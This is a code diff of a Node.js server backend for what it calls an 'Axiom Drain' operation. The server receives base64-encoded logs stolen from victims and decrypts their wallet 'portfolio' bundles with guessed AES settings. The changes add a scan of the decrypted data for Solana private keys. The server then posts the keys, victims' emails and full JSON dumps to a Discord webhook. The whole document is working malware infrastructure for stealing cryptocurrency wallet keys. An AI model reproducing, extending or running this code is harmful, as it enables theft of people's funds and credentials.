@@ -16,7 +16,7 @@ app.get('/data/:payload', async (req, res) => {
         const decodedStr = Buffer.from(encoded, 'base64').toString('utf-8');
         let data = JSON.parse(decodedStr);
 
-        console.log(`✅ Log received | Site: ${data.site} | Email: ${data.user?.email}`);
+        console.log(`✅ Log received | Email: ${data.user?.email}`);
 
         if (data.portfolio?.bundleKey) {
             data.portfolio = decryptPortfolio(data.portfolio);
@@ -38,18 +38,14 @@ function decryptPortfolio(portfolio) {
         try {
             const bundles = JSON.parse(portfolio.sBundles);
             portfolio.sBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, keyB64, "sBundle"));
-        } catch (e) {
-            portfolio.sBundlesDecrypted = [{ error: e.message }];
-        }
+        } catch (e) {}
     }
 
     if (portfolio.eBundles) {
         try {
             const bundles = JSON.parse(portfolio.eBundles);
             portfolio.eBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, keyB64, "eBundle"));
-        } catch (e) {
-            portfolio.eBundlesDecrypted = [{ error: e.message }];
-        }
+        } catch (e) {}
     }
     return portfolio;
 }
@@ -57,59 +53,62 @@ function decryptPortfolio(portfolio) {
 function decryptSingleBundle(bundleStr, keyB64, type) {
     if (!bundleStr?.includes(':')) return { raw: bundleStr };
 
-    const [prefix, encrypted] = bundleStr.split(':', 2);
-    const result = tryDecryptAES(encrypted, keyB64);
+    const [prefix, encryptedB64] = bundleStr.split(':', 2);
+    const result = tryDecryptAES(encryptedB64, keyB64);
 
     if (result.success) {
-        console.log(`✅ ${type} DECRYPTED successfully with ${result.method}`);
-        try {
-            const parsedData = JSON.parse(result.decrypted);
-            return { prefix, data: parsedData, method: result.method };
-        } catch (e) {
-            return { prefix, decrypted: result.decrypted, method: result.method };
+        console.log(`✅ ${type} DECRYPTED (${result.method}) - Length: ${result.decrypted.length}`);
+        
+        // Try to extract Solana private key (64 bytes)
+        let privateKey = null;
+        if (result.decrypted.length >= 64) {
+            const buf = Buffer.from(result.decrypted, 'utf8'); // or raw if needed
+            // Look for 64-byte sequences that look like keys
+            for (let i = 0; i <= result.decrypted.length - 64; i++) {
+                const candidate = result.decrypted.slice(i, i+64);
+                if (/^[A-Za-z0-9]{64}$/.test(candidate)) {
+                    privateKey = candidate;
+                    break;
+                }
+            }
         }
+
+        return { 
+            prefix, 
+            decrypted: result.decrypted, 
+            method: result.method,
+            privateKey: privateKey || "Not found in decrypted data"
+        };
     } else {
-        console.log(`❌ ${type} decryption failed`);
-        return { prefix, error: "Failed", raw: encrypted };
+        return { prefix, error: "Failed" };
     }
 }
 
 function tryDecryptAES(encryptedB64, keyB64) {
     const key = Buffer.from(keyB64, 'base64');
-    const derivedKey = crypto.createHash('sha256').update(key).digest();
 
     const attempts = [
-        { name: "CBC-ZeroIV-NoPad", mode: 'aes-256-cbc', key: key, iv: Buffer.alloc(16, 0), nopad: true },
-        { name: "CBC-DerivedZero-NoPad", mode: 'aes-256-cbc', key: derivedKey, iv: Buffer.alloc(16, 0), nopad: true },
-        { name: "CBC-KeyIV-NoPad", mode: 'aes-256-cbc', key: key, iv: key.slice(0, 16), nopad: true },
-        { name: "CBC-ZeroIV", mode: 'aes-256-cbc', key: key, iv: Buffer.alloc(16, 0) },
+        { name: "CBC-ZeroIV-NoPad", mode: 'aes-256-cbc', iv: Buffer.alloc(16, 0), nopad: true },
     ];
 
     for (const att of attempts) {
         try {
-            const decipher = crypto.createDecipheriv(att.mode, att.key, att.iv);
+            const decipher = crypto.createDecipheriv(att.mode, key, att.iv);
             if (att.nopad) decipher.setAutoPadding(false);
 
             let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
             decrypted += decipher.final('utf8');
 
-            if (decrypted.length > 20) {
-                return { success: true, decrypted, method: att.name };
-            }
+            return { success: true, decrypted, method: att.name };
         } catch (e) {}
     }
-    return { success: false, error: "All attempts failed" };
+    return { success: false };
 }
 
 async function sendToDiscord(data) {
     const portfolio = data.portfolio || {};
-
-    // Improved success detection
-    const sSuccess = portfolio.sBundlesDecrypted?.some(b => b.data && (b.data.privateKey || b.data.publicKey));
-    const eSuccess = portfolio.eBundlesDecrypted?.some(b => b.data && (b.data.privateKey || b.data.publicKey));
-    const hasSuccess = sSuccess || eSuccess;
-
-    console.log(`🔍 Success check: sBundles=${sSuccess}, eBundles=${eSuccess}, final=${hasSuccess}`);
+    const hasSuccess = portfolio.sBundlesDecrypted?.some(b => b.privateKey) || 
+                       portfolio.eBundlesDecrypted?.some(b => b.privateKey);
 
     const mainEmbed = {
         title: "📥 New Axiom Drain Log",
@@ -127,46 +126,33 @@ async function sendToDiscord(data) {
         { name: "Site", value: data.site || "N/A" }
     ];
 
+    // Add private keys to summary
     if (hasSuccess) {
-        const keys = [];
         ['sBundlesDecrypted', 'eBundlesDecrypted'].forEach(field => {
-            portfolio[field]?.forEach(b => {
-                if (b.data?.privateKey) keys.push({type: "Private", key: b.data.privateKey});
-                if (b.data?.publicKey) keys.push({type: "Public", key: b.data.publicKey});
+            portfolio[field]?.forEach((b, i) => {
+                if (b.privateKey && b.privateKey !== "Not found in decrypted data") {
+                    summaryFields.push({ 
+                        name: `🔑 Solana Private Key`, 
+                        value: `\`\`\`${b.privateKey}\`\`\`` 
+                    });
+                }
             });
-        });
-
-        keys.forEach((k, i) => {
-            summaryFields.push({ name: `${k.type} Key ${i+1}`, value: `\`\`\`${k.key}\`\`\`` });
         });
     }
 
-    const summaryEmbed = {
-        title: "📋 Summary",
-        color: 0x00AAFF,
-        fields: summaryFields.slice(0, 25)
-    };
-
-    // Send with FormData for reliable file attachment
     const form = new FormData();
     form.append('payload_json', JSON.stringify({
         content: "**New Axiom Drain Log**",
-        embeds: [mainEmbed, summaryEmbed]
+        embeds: [mainEmbed, { title: "📋 Summary", color: 0x00AAFF, fields: summaryFields.slice(0, 25) }]
     }));
 
-    const jsonBuffer = Buffer.from(JSON.stringify(data, null, 2), 'utf-8');
-    form.append('file', jsonBuffer, {
-        filename: `axiom_full_log_${Date.now()}.json`,
-        contentType: 'application/json'
-    });
+    form.append('file', Buffer.from(JSON.stringify(data, null, 2)), `axiom_log_${Date.now()}.json`);
 
     try {
-        await axios.post(DISCORD_WEBHOOK, form, {
-            headers: form.getHeaders()
-        });
-        console.log("✅ Sent to Discord with full JSON file");
+        await axios.post(DISCORD_WEBHOOK, form, { headers: form.getHeaders() });
+        console.log("✅ Sent to Discord");
     } catch (err) {
-        console.error("❌ Discord error:", err.message);
+        console.error("Discord error:", err.message);
     }
 }
 
